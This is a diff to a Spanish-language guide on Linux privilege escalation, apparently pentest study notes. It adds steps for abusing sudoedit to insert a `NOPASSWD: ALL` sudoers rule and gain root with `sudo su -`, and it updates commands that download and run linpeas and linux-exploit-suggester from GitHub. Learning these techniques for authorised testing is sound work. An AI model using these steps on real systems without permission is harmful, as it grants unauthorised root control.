@@ -143,6 +143,10 @@ El entorno EDITOR se manipula para inyectar parámetros adicionales a la herrami
 
 #### Ejecución e Inyección
 
+Ejecutaremos el comando `sudo -l` para ver que archivo podemos abrir con sudoedit
+
+Una vez encontrado ejecutaremos el *sudoedit* a ese mismo archivo
+
 ```
 sudoedit /ruta/a/archivo.txt
 ```
@@ -155,12 +159,18 @@ Una vez dentro modificamos el fichero añadiendo una política que otorga permis
 prueba ALL=(ALL:ALL) NOPASSWD: ALL
 ```
 
+También está la opción de modificar los permisos del usuario que somos actualmente y añadirle:
+
+```
+ALL=(ALL:ALL) NOPASSWD: ALL
+```
+
 El usuario `prueba` podrá ejecutar cualquier comando como cualquier usuario sin contraseña.
 
 Al salir del fichero ejecutamos:
 
 ```
-sudo su
+sudo su -
 ```
 
 Y automáticamente seremos el usuario `root`.
@@ -305,17 +315,17 @@ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 
 ```
 # Obtener script
-wget https://raw.githubusercontent.com/zldang/les/master/les.sh
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
 
 # Cambiamos las variables de entorno
-nano les.sh 
+nano linux-exploit-suggester.sh
 
 # Añadimos permisos de ejecución
-chmod +x les.sh
+chmod +x linux-exploit-suggester.sh
 
 # Arrancamos el programa
-./les.sh
+./linux-exploit-suggester.sh
 ```
 
 Al arrancarlo deberemos ver una lista de vulnerabilidades que tiene el equipo.
-
+ 
